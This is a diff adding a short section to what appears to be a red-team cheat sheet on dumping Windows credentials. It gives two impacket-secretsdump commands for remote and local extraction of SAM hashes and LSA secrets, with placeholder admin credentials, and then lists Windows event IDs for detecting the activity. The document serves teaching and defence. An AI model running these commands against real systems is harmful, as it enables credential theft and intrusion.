@@ -21,3 +21,14 @@ SAM = local account hashes; LSA secrets = service-account passwords, DPAPI machi
 
 ### Commands
 ```bash
+# ── Remote secretsdump ───────────────────────────────────────────────
+impacket-secretsdump corp.local/administrator:'Password123!'@10.10.10.5
+
+# ── Local hive dump ─────────────────────────────────────────────────
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+```
+
+### Detection
+**4656/4663** on registry hives `SAM`/`SECURITY`; `reg save` (**4688**); LSA secret access.
+
+---
